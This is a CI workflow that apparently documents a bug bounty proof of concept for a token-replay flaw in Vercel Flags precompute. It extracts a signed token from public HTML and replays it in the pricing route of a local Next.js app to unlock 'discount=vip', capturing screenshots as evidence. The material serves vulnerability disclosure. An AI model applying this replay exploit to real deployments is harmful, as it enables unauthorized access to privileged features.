name: Vercel Flags visual replay evidence

on:
  push:
    branches:
      - h1-vercel-flags-precompute-context-replay
  workflow_dispatch:

jobs:
  visual-evidence:
    runs-on: ubuntu-latest
    env:
      FLAGS_SECRET: Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M
      NEXT_TELEMETRY_DISABLED: 1

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '22'

      - name: Install app and browser
        run: |
          cd security/vercel-flags-precompute-replay/e2e
          npm install --no-audit --no-fund
          npm install --no-save playwright@1.55.0
          npx playwright install --with-deps chromium

      - name: Production build
        run: |
          cd security/vercel-flags-precompute-replay/e2e
          npm run build

      - name: Start production server
        run: |
          cd security/vercel-flags-precompute-replay/e2e
          npm run start > /tmp/next.log 2>&1 &
          echo $! > /tmp/next.pid
          ready=0
          for i in $(seq 1 30); do
            if curl --max-time 2 -fsS http://127.0.0.1:3000/ >/dev/null 2>&1; then
              ready=1
              break
            fi
            sleep 1
          done
          cat /tmp/next.log || true
          test "$ready" -eq 1
          echo "EVIDENCE production_server_ready=true"

      - name: Capture real exploit responses in Chromium
        run: |
          cd security/vercel-flags-precompute-replay/e2e
          mkdir -p evidence/video
          cat > visual-evidence.mjs <<'NODE'
          import { chromium } from 'playwright';
          import fs from 'node:fs';
          import crypto from 'node:crypto';

          const origin = 'http://127.0.0.1:3000';

          async function get(path) {
            const res = await fetch(origin + path);
            const body = await res.text();
            if (!res.ok) throw new Error('HTTP ' + res.status + ' for ' + path);
            return body;
          }

          const rootHtml = await get('/');
          const tokenMatch = rootHtml.match(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+/);
          if (!tokenMatch) throw new Error('Could not extract signed source token from public HTML');
          const token = tokenMatch[0];

          function renderedText(html) {
            return html
              .replace(/<!--.*?-->/g, '')
              .replace(/<[^>]+>/g, ' ')
              .replace(/\s+/g, ' ')
              .trim();
          }

          const baselinePath = '/pricing';
          const baselineHtml = await get(baselinePath);
          if (!renderedText(baselineHtml).includes('discount=none')) {
            throw new Error('Normal pricing flow did not render discount=none');
          }

          const replayPath = '/' + token + '/pricing/' + token;
          const replayHtml = await get(replayPath);
          if (!renderedText(replayHtml).includes('discount=vip')) {
            throw new Error('Replay production response did not render discount=vip');
          }

          const tokenHash = crypto.createHash('sha256').update(token).digest('hex');

          const browser = await chromium.launch({ headless: true });
          const context = await browser.newContext({
            viewport: { width: 1280, height: 720 },
            recordVideo: { dir: 'evidence/video', size: { width: 1280, height: 720 } },
          });
          const page = await context.newPage();

          async function annotate(title, lines) {
            await page.evaluate(({ title, lines }) => {
              const old = document.getElementById('__h1_evidence');
              if (old) old.remove();
              const box = document.createElement('div');
              box.id = '__h1_evidence';
              Object.assign(box.style, {
                position: 'fixed',
                top: '16px',
                left: '16px',
                right: '16px',
                zIndex: '2147483647',
                background: 'rgba(0,0,0,.92)',
                color: '#fff',
                padding: '16px 20px',
                borderRadius: '12px',
                fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
                fontSize: '18px',
                lineHeight: '1.45',
                whiteSpace: 'pre-wrap',
              });
              const h = document.createElement('div');
              h.textContent = title;
              h.style.fontWeight = '700';
              h.style.fontSize = '22px';
              h.style.marginBottom = '8px';
              box.appendChild(h);
              const body = document.createElement('div');
              body.textContent = lines.join('\n');
              box.appendChild(body);
              document.body.appendChild(box);
            }, { title, lines });
          }

          await page.goto(origin + baselinePath, { waitUntil: 'networkidle' });
          await annotate('BASELINE — legitimate target token', [
            'Observed application result: discount=none',
            'Source token SHA-256: ' + tokenHash,
            'Baseline path: /pricing (normal documented flow)',
          ]);
          await page.screenshot({ path: 'evidence/01-baseline-real-production-response.png', fullPage: true });
          await page.waitForTimeout(2200);

          await page.goto(origin + replayPath, { waitUntil: 'networkidle' });
          await annotate('EXPLOIT — source token replayed as target token', [
            'Observed application result: discount=vip',
            'Source token SHA-256: ' + tokenHash,
            'Same source token reused in pricing position: true',
            'Token modified: false',
          ]);
          await page.screenshot({ path: 'evidence/02-replay-real-production-response.png', fullPage: true });
          await page.waitForTimeout(3200);

          fs.writeFileSync('evidence/evidence.txt', [
            'SOURCE=real Next.js production server responses',
            'flags=4.3.1',
            'next=16.3.6',
            'node=' + process.version,
            'baseline_request=' + baselinePath,
            'baseline_result=discount=none',
            'replay_request=' + replayPath,
            'replay_result=discount=vip',
            'source_token_sha256=' + tokenHash,
            'same_token_used_for_root_and_pricing=true',
            'token_modified=false',
            'cross_group_replay=PASS',
          ].join('\n') + '\n');

          console.log('EVIDENCE baseline=discount=none');
          console.log('EVIDENCE replay=discount=vip');
          console.log('EVIDENCE same_token_used_for_root_and_pricing=true');
          console.log('EVIDENCE token_modified=false');
          console.log('EVIDENCE cross_group_replay=PASS');

          await context.close();
          await browser.close();
          NODE
          node visual-evidence.mjs

      - name: Upload visual evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: vercel-flags-visual-evidence
          path: |
            security/vercel-flags-precompute-replay/e2e/evidence/**
          if-no-files-found: warn
          retention-days: 7
